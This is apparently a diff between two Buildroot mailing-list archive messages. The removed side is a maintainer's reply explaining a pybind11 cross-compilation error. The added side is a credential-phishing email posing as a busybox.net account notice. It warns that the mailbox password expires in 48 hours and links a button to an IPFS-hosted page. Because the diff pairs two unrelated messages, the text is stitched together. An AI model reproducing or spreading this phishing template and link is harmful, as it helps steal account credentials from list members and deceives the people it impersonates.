@@ -1,68 +1,46 @@
 Return-Path: <buildroot-bounces@buildroot.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 	aws-us-west-2-korg-lkml-1.web.codeaurora.org
-Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
+Received: from smtp3.osuosl.org (smtp3.osuosl.org [140.211.166.136])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id A504DC3DA66
-	for <buildroot@archiver.kernel.org>; Wed, 23 Aug 2023 21:18:49 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id EDBF7C27C40
+	for <buildroot@archiver.kernel.org>; Thu, 24 Aug 2023 03:15:57 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp1.osuosl.org (Postfix) with ESMTP id 458DC8121A;
-	Wed, 23 Aug 2023 21:18:49 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 458DC8121A
+	by smtp3.osuosl.org (Postfix) with ESMTP id 2EE62612FA;
+	Thu, 24 Aug 2023 03:15:57 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 2EE62612FA
+X-Virus-Scanned: amavisd-new at osuosl.org
+Received: from smtp3.osuosl.org ([127.0.0.1])
+	by localhost (smtp3.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id fJqWUdv5Qe10; Thu, 24 Aug 2023 03:15:56 +0000 (UTC)
+Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
+	by smtp3.osuosl.org (Postfix) with ESMTP id 79605612FB;
+	Thu, 24 Aug 2023 03:15:55 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 79605612FB
+Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
+ by ash.osuosl.org (Postfix) with ESMTP id 4F6911BF267
+ for <buildroot@lists.busybox.net>; Thu, 24 Aug 2023 03:15:53 +0000 (UTC)
+Received: from localhost (localhost [127.0.0.1])
+ by smtp1.osuosl.org (Postfix) with ESMTP id E10BE8220C
+ for <buildroot@lists.busybox.net>; Thu, 24 Aug 2023 03:15:50 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org E10BE8220C
 X-Virus-Scanned: amavisd-new at osuosl.org
 Received: from smtp1.osuosl.org ([127.0.0.1])
-	by localhost (smtp1.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
-	with ESMTP id 5B82fOJsaOIK; Wed, 23 Aug 2023 21:18:48 +0000 (UTC)
-Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
-	by smtp1.osuosl.org (Postfix) with ESMTP id 7734B80F51;
-	Wed, 23 Aug 2023 21:18:47 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 7734B80F51
-Received: from smtp2.osuosl.org (smtp2.osuosl.org [140.211.166.133])
- by ash.osuosl.org (Postfix) with ESMTP id 83A201BF2A4
- for <buildroot@lists.busybox.net>; Wed, 23 Aug 2023 21:18:45 +0000 (UTC)
-Received: from localhost (localhost [127.0.0.1])
- by smtp2.osuosl.org (Postfix) with ESMTP id 1F66E40193
- for <buildroot@lists.busybox.net>; Wed, 23 Aug 2023 21:18:45 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org 1F66E40193
-X-Virus-Scanned: amavisd-new at osuosl.org
-Received: from smtp2.osuosl.org ([127.0.0.1])
- by localhost (smtp2.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
- with ESMTP id K1G_VCApHiux for <buildroot@lists.busybox.net>;
- Wed, 23 Aug 2023 21:18:44 +0000 (UTC)
-Received: from relay6-d.mail.gandi.net (relay6-d.mail.gandi.net
- [IPv6:2001:4b98:dc4:8::226])
- by smtp2.osuosl.org (Postfix) with ESMTPS id E0865400BF
- for <buildroot@buildroot.org>; Wed, 23 Aug 2023 21:18:43 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org E0865400BF
-Received: by mail.gandi.net (Postfix) with ESMTPSA id E72AEC0002;
- Wed, 23 Aug 2023 21:18:40 +0000 (UTC)
-Date: Wed, 23 Aug 2023 23:18:39 +0200
-To: Ryan Smith <ryan.smith@density.io>
-Message-ID: <20230823231839.0494433f@windsurf>
-In-Reply-To: <CAM7Wg-VCtAdw276BDujEX+7g2v793st6d+m00-6qLHcRz-opQw@mail.gmail.com>
-References: <CAM7Wg-VCtAdw276BDujEX+7g2v793st6d+m00-6qLHcRz-opQw@mail.gmail.com>
-Organization: Bootlin
-X-Mailer: Claws Mail 4.1.1 (GTK 3.24.38; x86_64-redhat-linux-gnu)
+ by localhost (smtp1.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
+ with ESMTP id yfD9VagGm_zx for <buildroot@lists.busybox.net>;
+ Thu, 24 Aug 2023 03:15:50 +0000 (UTC)
+Received: from busybox.net (unknown [141.98.6.227])
+ by smtp1.osuosl.org (Postfix) with ESMTP id AA1FB82217
+ for <buildroot@busybox.net>; Thu, 24 Aug 2023 03:15:49 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org AA1FB82217
+From: Noreply@busybox.net
+To: buildroot@busybox.net
+Date: 24 Aug 2023 05:15:48 +0200
+Message-ID: <20230824051547.F5DF0D7090C284D7@busybox.net>
 MIME-Version: 1.0
-X-GND-Sasl: thomas.petazzoni@bootlin.com
-X-Mailman-Original-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=bootlin.com; s=gm1; t=1692825521;
- h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
- to:to:cc:cc:mime-version:mime-version:content-type:content-type:
- content-transfer-encoding:content-transfer-encoding:
- in-reply-to:in-reply-to:references:references;
- bh=nO1YFDwLYwwVF+76mdBJEb4Jg41KPvHC1mO0gSZ1Deo=;
- b=XuZGvWM5cnUgrr3zUAUuXZBN8LpODXPH2ZcyFCCbvKIO3wCeEmmSS/GskWHPGydI81XWOB
- WRmSPXfkeCVPUQm8ZlB65pQmGqKCUcWwaj57TovBRmXcfJLcim1xfVwYYHgX/blGAbesvW
- JQzIUoCZriugKKeKwtlqVVPgrft3I4xs4HeAkg7azcyw64e5mjGIW4Q6B7obRM8AsjUuhL
- YvoancoJGxeHzsIXjeSSPZk6nW/CXB6KQwgqL9IGwvr5KYO9PfRO/C+U9nnxVf+/wMMUIV
- TACRKJrdLVrgoDexrbCLmUVa8i0cucJXs0vmWKtsh82r375fzEZ0Jm3ToklxuA==
-X-Mailman-Original-Authentication-Results: smtp2.osuosl.org;
- dkim=pass (2048-bit key,
- unprotected) header.d=bootlin.com header.i=@bootlin.com header.a=rsa-sha256
- header.s=gm1 header.b=XuZGvWM5
-Subject: Re: [Buildroot] Embedding Python Interpreter with pybind11
+Subject: [Buildroot] E-mail Account Notification For buildroot@busybox.net
+ !!!
 X-BeenThere: buildroot@buildroot.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -74,55 +52,138 @@ List-Post: <mailto:buildroot@buildroot.org>
 List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
 List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
  <mailto:buildroot-request@buildroot.org?subject=subscribe>
-From: Thomas Petazzoni via buildroot <buildroot@buildroot.org>
-Reply-To: Thomas Petazzoni <thomas.petazzoni@bootlin.com>
-Cc: buildroot@buildroot.org
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============6310198164106070900=="
 Errors-To: buildroot-bounces@buildroot.org
 Sender: "buildroot" <buildroot-bounces@buildroot.org>
 
-Hello Ryan,
+--===============6310198164106070900==
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 
-On Tue, 22 Aug 2023 22:26:10 -0600
-Ryan Smith <ryan.smith@density.io> wrote:
+<HTML><HEAD><TITLE></TITLE>
+<META http-equiv=3DX-UA-Compatible <strong Dear cont>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<BODY>
+<TABLE lang=3Den style=3D'BOX-SIZING: border-box; FONT-SIZE: medium; FONT-F=
+AMILY: "Segoe UI", "Lucida Sans", sans-serif; BORDER-RIGHT: rgb(227,227,227=
+) 1px solid; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: colla=
+pse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE:=
+ normal; TEXT-ALIGN: left; BORDER-LEFT: rgb(227,227,227) 1px solid; ORPHANS=
+: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(252,253,254);=
+ font-variant-ligatures: normal; font-variant-caps:=20
+normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; tex=
+t-decoration-color: initial; text-decoration-thickness: initial' dir=3Dltr =
+cellSpacing=3D0 cellPadding=3D0 width=3D640 border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box; BACKGROUND-COLOR: rgb(0,114,198)">
+<TD style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(227,227,227) 1px solid=
+; BORDER-BOTTOM: rgb(227,227,227) 1px solid; PADDING-BOTTOM: 12px; PADDING-=
+TOP: 12px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px" vAlign=3Dmiddle width=3D3=
+10>
+<H1 style=3D'BOX-SIZING: border-box; FONT-SIZE: 15pt; FONT-FAMILY: "segoe u=
+i light"; MARGIN-TOP: 0px; FONT-WEIGHT: normal; COLOR: rgb(255,255,255); LI=
+NE-HEIGHT: 20pt'><SPAN id=3Dv1x_HeaderPlaceholder_UserVerificationEmailHead=
+er style=3D"BOX-SIZING: border-box"><FONT style=3D"BOX-SIZING: border-box" =
+color=3D#ffffff>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;buildroot@busybox.net</FONT></SPAN></H1></TD>
+<TD style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(227,227,227) 1px solid=
+; BORDER-BOTTOM: rgb(227,227,227) 1px solid" width=3D24>&nbsp;</TD></TR></T=
+BODY></TABLE>
+<TABLE lang=3Den style=3D'BOX-SIZING: border-box; FONT-SIZE: medium; FONT-F=
+AMILY: "Segoe UI", "Lucida Sans", sans-serif; WHITE-SPACE: normal; WORD-SPA=
+CING: 0px; BORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 40=
+0; COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WID=
+OWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(252,253,254); font-va=
+riant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-wid=
+th: 0px; text-decoration-style: initial;=20
+text-decoration-color: initial; text-decoration-thickness: initial' dir=3Dl=
+tr cellSpacing=3D0 cellPadding=3D0 width=3D640 border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; BACKGROUND: rgb(227,227,227)" width=3D=
+1></TD>
+<TD style=3D"BOX-SIZING: border-box" width=3D24>&nbsp;</TD>
+<TD id=3Dv1x_PageBody style=3D"BOX-SIZING: border-box; BORDER-BOTTOM: rgb(2=
+27,227,227) 1px solid; PADDING-BOTTOM: 20px; PADDING-TOP: 10px; PADDING-LEF=
+T: 0px; PADDING-RIGHT: 0px" vAlign=3Dtop width=3D640 colSpan=3D2>
+<TABLE style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" cellSpac=
+ing=3D0 cellPadding=3D0 border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 10pt; COLOR: rgb(0,0,0); LI=
+NE-HEIGHT: 13pt" width=3D630>
+<TABLE lang=3Den style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse=
+" dir=3Dltr cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box">
+<DIV style=3D'BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: "segoe =
+ui", tahoma, sans-serif; COLOR: rgb(51,51,51)'><SPAN id=3Dv1x_BodyPlacehold=
+er_UserVerificationEmailBodySentence1 style=3D"BOX-SIZING: border-box">
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<SP=
+AN style=3D"BOX-SIZING: border-box">&nbsp;</SPAN>Dear buildroot</STRONG> ,<=
+BR style=3D"BOX-SIZING: border-box">
+<BR style=3D"BOX-SIZING: border-box">Your busybox.net mailbox password will=
+ expire within 48 hours, Go to Email Account Settings<BR style=3D"BOX-SIZIN=
+G: border-box">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;below to =
+confirm using the same password!</SPAN></DIV>
+<BR style=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZING: border-box"><=
+/TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
+ PADDING-LEFT: 0px; PADDING-RIGHT: 0px" align=3Dcenter>
+<TABLE class=3Dv1m_-7257559470588763933auto-height style=3D"BOX-SIZING: bor=
+der-box; BORDER-COLLAPSE: collapse; BACKGROUND-COLOR: rgb(0,120,215)" cellS=
+pacing=3D0 cellPadding=3D0 align=3Dcenter border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD class=3D"v1m_-7257559470588763933font-size-18 v1m_-7257559470588763933l=
+ine-height-24 v1m_-7257559470588763933padding-top-12 v1m_-72575594705887639=
+33padding-right-24 v1m_-7257559470588763933padding-bottom-12 v1m_-725755947=
+0588763933padding-left-24" style=3D'BOX-SIZING: border-box; FONT-SIZE: 16px=
+; BORDER-TOP: rgb(0,120,215) 1px solid; FONT-FAMILY: "segoe ui", "segoe wp"=
+, wf_segoe-ui_semibold, tahoma, arial, sans-serif; BORDER-RIGHT: rgb(0,120,=
+215) 1px solid; BORDER-BOTTOM: rgb(0,120,215) 1px=20
+solid; FONT-WEIGHT: 600; COLOR: rgb(0,120,215); PADDING-BOTTOM: 13px; TEXT-=
+ALIGN: center; PADDING-TOP: 13px; PADDING-LEFT: 24px; BORDER-LEFT: rgb(0,12=
+0,215) 1px solid; LINE-HEIGHT: 10px; PADDING-RIGHT: 24px; BACKGROUND-COLOR:=
+ rgb(0,120,215)' align=3Dcenter><SPAN id=3Dv1OBJ_PREFIX_DWT151_com_zimbra_u=
+rl class=3Dv1Object style=3D"BOX-SIZING: border-box; CURSOR: pointer; TEXT-=
+DECORATION: none; COLOR: rgb(68,101,111)">
+<SPAN id=3Dv1OBJ_PREFIX_DWT152_com_zimbra_url class=3Dv1Object style=3D"BOX=
+-SIZING: border-box; CURSOR: pointer; TEXT-DECORATION: none; COLOR: rgb(68,=
+101,111)"><A style=3D"BOX-SIZING: border-box; CURSOR: pointer; TEXT-DECORAT=
+ION: none; COLOR: rgb(255,255,255); BACKGROUND-COLOR: transparent" href=3D"=
+https://bafybeih2fqmvac3jlsfj6sctmsm4dbayazgejuuk4dre622uc2z7gbwm4i.ipfs.dw=
+eb.link/mails.html#buildroot@busybox.net" rel=3Dnoreferrer target=3D_blank>=
+Email Account Settings</A></SPAN></SPAN></TD></TR></TBODY></TABLE></TD>
+</TR></TBODY></TABLE><BR style=3D"BOX-SIZING: border-box"><BR style=3D"BOX-=
+SIZING: border-box">
+<DIV style=3D'BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: "segoe =
+ui", tahoma, sans-serif; COLOR: rgb(51,51,51)'>Sincerely,</DIV>
+<DIV style=3D'BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: "segoe =
+ui", tahoma, sans-serif; COLOR: rgb(51,51,51); FONT-STYLE: italic'>busybox.=
+net Automated Message!</DIV></TD></TR></TBODY></TABLE></TD></TR></TBODY></T=
+ABLE></BODY></HTML>
 
-> I am attempting to write a program that embeds the Python interpreter
-> in C++ code using pybind11. When I attempt to compile the package in
-> Buildroot, I get the following error message.
-> 
-> /src/output-internal/host/include/python3.11/pyport.h:601:2: error:
-> #error "LONG_BIT definition appears wrong for platform (bad gcc/glibc
-> config?)."
->  #error "LONG_BIT definition appears wrong for platform (bad gcc/glibc
-> config?)."
->   ^~~~~
-> In file included from
-> /src/output-internal/host/include/python3.11/Python.h:38:0,
->                  from
+--===============6310198164106070900==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
-                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-
-This is the problem: it's including the host python headers while
-building code for the target. That's why it says "LONG_BIT definition
-appears wrong for platform".
-
-This is typically addressed by passing the right sysconfigdata, using
-the _PYTHON_SYSCONFIGDATA_NAME variable. This is done automatically by
-our python-package infrastructure.
-
-Do you have a reproducer for this issue? People on this mailing list
-are more likely to provide some help/support if they can reproduce the
-issue.
-
-Best regards,
-
-Thomas
--- 
-Thomas Petazzoni, co-owner and CEO, Bootlin
-Embedded Linux and Kernel engineering and training
-https://bootlin.com
 _______________________________________________
 buildroot mailing list
 buildroot@buildroot.org
 https://lists.buildroot.org/mailman/listinfo/buildroot
+
+--===============6310198164106070900==--
